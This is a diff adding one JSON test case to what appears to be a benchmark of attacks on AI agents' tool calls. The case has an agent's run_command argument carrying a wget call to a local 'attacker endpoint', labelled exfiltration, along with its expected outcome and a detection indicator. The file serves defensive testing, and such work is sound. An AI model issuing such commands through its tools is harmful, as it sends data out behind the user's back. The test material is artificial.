@@ -1,0 +1,17 @@
+{
+  "case_id": "EX-02",
+  "category": "exfiltration",
+  "attack_name": "Wget exfiltration via shell",
+  "server": "shell_server",
+  "tool": "run_command",
+  "arguments": {
+    "command": "wget -q http://127.0.0.1:9999/collect -O /dev/null"
+  },
+  "expected_without_defense": "success",
+  "attack_indicator": {
+    "type": "network_connection",
+    "host": "127.0.0.1",
+    "port": 9999
+  },
+  "description": "Argument-visible: shell command with wget to attacker endpoint is visible in arguments"
+}
